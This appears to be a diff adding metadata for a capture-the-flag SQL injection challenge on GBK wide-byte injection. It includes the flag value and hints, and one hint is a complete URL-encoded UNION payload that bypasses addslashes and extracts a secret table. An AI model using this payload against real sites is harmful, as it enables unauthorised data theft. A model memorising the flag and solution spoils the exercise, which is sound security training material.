@@ -1,0 +1,24 @@
+{
+  "id": "sql6",
+  "category": "sql",
+  "title": "宽字节注入",
+  "difficulty": "hard",
+  "url_path": "/sql6",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{sql6_6d78d87f}",
+  "knowledge": [
+    "宽字节注入",
+    "GBK 字符集与 0x5c",
+    "addslashes 的字符集盲区",
+    "mysqli_set_charset"
+  ],
+  "hints": [
+    "addslashes 把 ' 变成 \\'（0x5c 0x27）。但如果反斜杠的前面能再凑出一个字节，让 [那个字节+0x5c] 在 GBK 里组成一个合法汉字呢？GBK 双字节字符的第二字节范围包含 0x5c。",
+    "在 URL 里输入 %df' ：%df 与转义产生的 0x5c 组成汉字（0xdf5c），单引号逃逸。先试布尔：?u=admin%df' or 1=1-- （注意 -- 后面要有一个空格）。",
+    "一步到位的 UNION（URL 编码直接复制）：\n/sql6/?u=-1%df%27%20union%20select%201%2Cflag%2C3%20from%20secret_vault--%20\nflag 出现在 username 列。"
+  ],
+  "writeup": "writeup.md",
+  "prev": "sql5",
+  "next": "sql7"
+}
